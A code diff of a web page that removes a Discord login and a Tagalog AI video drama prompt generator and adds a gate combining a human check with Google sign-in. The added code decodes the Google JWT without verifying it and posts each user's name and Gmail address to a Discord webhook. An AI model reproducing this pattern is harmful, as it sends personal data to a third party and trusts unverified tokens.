-      const authUrl =
-        "https://discord.com/oauth2/authorize" +
-        "?client_id=" + encodeURIComponent(DISCORD_CLIENT_ID) +
-        "&response_type=token" +
-        "&redirect_uri=" + encodeURIComponent(DISCORD_REDIRECT_URI) +
-        "&scope=" + encodeURIComponent("identify email");
+    let humanOk = false;
+    let gmailName = "";
+    let gmailEmail = "";
 
-      window.location.href = authUrl;
-    });
-
-    (function checkDiscordRedirectToken() {
-      if (!window.location.hash) return;
-      const params = new URLSearchParams(window.location.hash.slice(1));
-      const accessToken = params.get("access_token");
-      const tokenType = params.get("token_type") || "Bearer";
-      if (!accessToken) return;
-
-      history.replaceState(null, "", window.location.pathname + window.location.search);
-
-      fetch("https://discord.com/api/users/@me", {
-        headers: { Authorization: tokenType + " " + accessToken }
-      })
-        .then((res) => (res.ok ? res.json() : Promise.reject()))
-        .then((user) => {
-          const displayName = user.global_name || user.username || "Discord User";
-          const subText = user.email ? user.email + " (@" + user.username + ")" : "@" + user.username;
-          const avatarUrl = user.avatar
-            ? "https://cdn.discordapp.com/avatars/" + user.id + "/" + user.avatar + ".png?size=128"
-            : "";
-          showSideAccount("Discord Account", displayName, subText, avatarUrl);
-        })
-        .catch(() => {
-          statusMsg.textContent = "Unable to load Discord account info.";
-          statusMsg.className = "status-msg error";
-        });
-    })();
-
-    /* AI Video Drama Prompt Generator Logic */
-    const premiseInput = document.getElementById("drama-premise");
-    const moodSelect = document.getElementById("drama-mood");
-    const scenesSelect = document.getElementById("drama-scenes");
-    const generatePromptBtn = document.getElementById("generate-prompt-btn");
-    const promptOutput = document.getElementById("prompt-output");
-    const copyPromptBtn = document.getElementById("copy-prompt-btn");
-    const openFlowBtn = document.getElementById("open-flow-btn");
-    const copyFeedback = document.getElementById("copy-feedback");
-
-    const sceneTemplates = [
-      {
-        shot: "Establishing Wide Shot & Medium Close-Up",
-        camera: "Slow dolly-in with shallow depth of field, warm dusk lighting, cinematic Filipino drama realism",
-        line: "\"Hindi ko akalaing darating ang araw na magkaharap tayo muli.\""
-      },
-      {
-        shot: "Over-the-Shoulder Reaction Shot",
-        camera: "Handheld subtle micro-movement, moody side rim light, expressive facial emotion",
-        line: "\"Bakit ngayon ka lang nagpakita matapos ang lahat ng tiniis namin?\""
-      },
-      {
-        shot: "Tight Emotional Close-Up",
-        camera: "Rack focus from background to tearful eyes, dramatic natural shadows, high-detail cinema lens",
-        line: "\"May dahilan ang bawat hakbang ko, at handa akong harapin ang totoo.\""
-      },
-      {
-        shot: "Tracking Walk & Dramatic Pause",
-        camera: "Smooth Steadicam follow shot through a quiet neighborhood street, golden-hour contrast",
-        line: "\"Kung ito man ang simula ng bagong kabanata, hindi na ako tatakbo.\""
-      },
-      {
-        shot: "Final Cliffhanger Push-In",
-        camera: "Slow dramatic push-in with ambient city lights softly blurred, intense cliffhanger tone",
-        line: "\"Abangan mo ang susunod na mangyayari dahil hindi pa ito tapos.\""
-      }
-    ];
-
-    function buildDramaPrompt() {
-      const premise = (premiseInput.value || "").trim() || "Isang madamdaming kwentong pampamilya sa Pilipinas.";
-      const mood = moodSelect.value;
-      const count = parseInt(scenesSelect.value, 10) || 4;
-
-      const lines = [
-        "PINOY AI VIDEO DRAMA PROMPT (CONTINUOUS MULTI-SCENE)",
-        "Mood: " + mood,
-        "Premise: " + premise,
-        "Visual Style: Photorealistic cinematic Philippine drama, consistent character faces and outfits across all scenes, natural skin texture, emotional pacing, Tagalog spoken dialogue.",
-        ""
-      ];
-
-      for (let i = 0; i < count; i++) {
-        const tpl = sceneTemplates[i % sceneTemplates.length];
-        lines.push("Scene " + (i + 1) + " (Continuous from Scene " + (i === 0 ? "0 / Opening" : i) + "):");
-        lines.push("- Framing: " + tpl.shot);
-        lines.push("- Camera & Lighting: " + tpl.camera);
-        lines.push("- Action: Characters continue the exact moment from the premise in a " + mood.toLowerCase() + " setting.");
-        lines.push("- Tagalog Dialogue: " + tpl.line);
-        lines.push("");
-      }
-
-      promptOutput.value = lines.join("\n").trim();
-      copyFeedback.textContent = "";
+    function parseJwtPayload(token) {
+      const base64Url = token.split(".")[1];
+      const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
+      const jsonPayload = decodeURIComponent(
+        atob(base64)
+          .split("")
+          .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
+          .join("")
+      );
+      return JSON.parse(jsonPayload);
     }
 
-    buildDramaPrompt();
-    generatePromptBtn.addEventListener("click", buildDramaPrompt);
-
-    copyPromptBtn.addEventListener("click", () => {
-      if (!promptOutput.value) return;
-      navigator.clipboard.writeText(promptOutput.value).then(() => {
-        copyFeedback.textContent = "Prompt copied to clipboard.";
-      }).catch(() => {
-        promptOutput.select();
-        document.execCommand("copy");
-        copyFeedback.textContent = "Prompt copied.";
-      });
-    });
-
-    openFlowBtn.addEventListener("click", () => {
-      if (promptOutput.value && navigator.clipboard) {
-        navigator.clipboard.writeText(promptOutput.value).catch(() => {});
+    function updateReadyState() {
+      if (humanOk && gmailEmail) {
+        statusMsg.textContent = "Verified and signed in. Click Continue.";
+        statusMsg.className = "status-msg success";
+        continueBtn.disabled = false;
+      } else if (humanOk && !gmailEmail) {
+        statusMsg.textContent = "Human check passed. Drag the Gmail logo to sign in.";
+        statusMsg.className = "status-msg";
+        continueBtn.disabled = true;
+      } else if (!humanOk && gmailEmail) {
+        statusMsg.textContent = "Gmail signed in. Complete human verification.";
+        statusMsg.className = "status-msg";
+        continueBtn.disabled = true;
+      } else {
+        statusMsg.textContent = "Complete human check and slide Gmail logo to sign in.";
+        statusMsg.className = "status-msg";
+        continueBtn.disabled = true;
       }
-      window.open(FLOW_URL, "_blank", "noopener,noreferrer");
-    });
+    }
 
-    continueBtn.addEventListener("click", () => {
-      if (!humanOk || !signedInUser) return;
-      gateLayout.style.display = "none";
-      generatorSection.classList.add("active");
-      buildDramaPrompt();
+    function onHumanVerified(token) {
+      humanOk = Boolean(token);
+      updateReadyState();
+    }
+
+    function onHumanExpired() {
+      humanOk = false;
+      updateReadyState();
+    }
+
+    function onHumanError() {
+      humanOk = false;
+      statusMsg.textContent = "Human verification failed. Check domain and connection.";
+      statusMsg.className = "status-msg error";
+      continueBtn.disabled = true;
+    }
+
+    function onGoogleCredential(response) {
+      try {
+        const profile = parseJwtPayload(response.credential);
+        gmailEmail = profile.email || "Google Account";
+        gmailName = profile.name || gmailEmail.split("@")[0] || "Gmail User";
+
+        accountName.textContent = gmailName;
+        accountEmail.textContent = gmailEmail;
+        avatarInitial.textContent = gmailName.charAt(0).toUpperCase() || "G";
+
+        if (profile.picture) {
+          avatarImg.src = profile.picture;
+          avatarImg.onload = () => {
+            avatarImg.style.display = "block";
+            avatarInitial.style.display = "none";
+          };
+        }
+
+        sideAccountPanel.classList.add("visible");
+        updateReadyState();
+      } catch (e) {
+        gmailName = "";
+        gmailEmail = "";
+        sideAccountPanel.classList.remove("visible");
+        statusMsg.textContent = "Unable to read Gmail account info.";
+        statusMsg.className = "status-msg error";
+        continueBtn.disabled = true;
+      }
+    }
+
+    async function sendToDiscordWebhook() {
+      if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL") {
+        throw new Error("Missing webhook URL");
+      }
+
+      const payload = {
+        content: "New Verified Gmail Sign-In",
+        embeds: [
+          {
+            title: "Verification & Gmail Login",
+            color: 2450411,
+            fields: [
+              { name: "Name", value: gmailName || "N/A", inline: true },
+              { name: "Gmail", value: gmailEmail || "N/A", inline: true },
+              { name: "Human Check", value: humanOk ? "Verified" : "Unverified", inline: true },
+              { name: "Source", value: window.location.hostname || "localhost", inline: false }
+            ],
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      const res = await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      if (!res.ok) {
+        throw new Error("Webhook failed");
+      }
+    }
+
+    continueBtn.addEventListener("click", async () => {
+      if (!humanOk || !gmailEmail) return;
+      continueBtn.disabled = true;
+      continueBtn.textContent = "Sending...";
+
+      try {
+        await sendToDiscordWebhook();
+        statusMsg.textContent = "Verified, Gmail signed in, and sent to Discord webhook.";
+        statusMsg.className = "status-msg success";
+        continueBtn.textContent = "Sent";
+      } catch (err) {
+        statusMsg.textContent = "Verified and signed in, but webhook failed to send. Check URL.";
+        statusMsg.className = "status-msg error";
+        continueBtn.textContent = "Continue";
+        continueBtn.disabled = false;
+      }
     });
   </script>
 </body>
